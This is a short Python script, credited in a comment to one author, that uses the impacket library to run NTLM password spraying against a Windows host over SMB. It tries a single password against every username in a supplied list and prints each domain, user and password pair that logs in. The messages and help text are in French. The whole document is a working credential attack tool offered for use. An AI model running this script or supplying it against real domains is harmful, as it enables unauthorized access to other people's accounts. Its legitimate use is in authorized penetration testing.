from impacket.smbconnection import SMBConnection
import argparse
import sys

# Script NTLM Password Spraying - Créé par 0xgh05t | www.linkedin.com/in/eddie-gbaguidi

def password_spray(target, domain, username_list, password, verbose):
    successful = []
    for username in username_list:
        username = username.strip()
        try:
            smb = SMBConnection(target, target)
            smb.login(username, password, domain)
            if verbose:
                print(f"[+] Succès: {domain}\\{username}:{password}")
            successful.append((username, password))
        except:
            if verbose:
                print(f"[-] Échec: {domain}\\{username}:{password}")
    return successful

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="NTLM Password Spraying Tool")

    parser.add_argument('-u', '--userfile', required=True, help='Fichier avec liste des utilisateurs')
    parser.add_argument('-f', '--fqdn', required=True, help='Domaine complet (FQDN)')
    parser.add_argument('-p', '--password', required=True, help='Mot de passe à tester')
    parser.add_argument('-a', '--attackurl', required=False, help='URL cible ou service SMB, optionnel pour compatibilité future')
    parser.add_argument('-t', '--target', required=True, help='Adresse IP ou hostname de la cible')
    parser.add_argument('-v', '--verbose', action='store_true', help='Afficher toutes les tentatives en temps réel')

    args = parser.parse_args()

    try:
        with open(args.userfile, 'r') as file:
            usernames = file.readlines()
    except FileNotFoundError:
        print("[-] Fichier des utilisateurs introuvable.")
        sys.exit(1)

    successful_logins = password_spray(args.target, args.fqdn, usernames, args.password, args.verbose)

    if successful_logins:
        print("\n[*] Comptes valides trouvés :")
        print("----------------------------------")
        for u, p in successful_logins:
            print(f"Domaine: {args.fqdn}\nUtilisateur: {u}\nMot de passe: {p}\n------------------------------")
    else:
        print("\n[-] Aucun compte valide trouvé.")
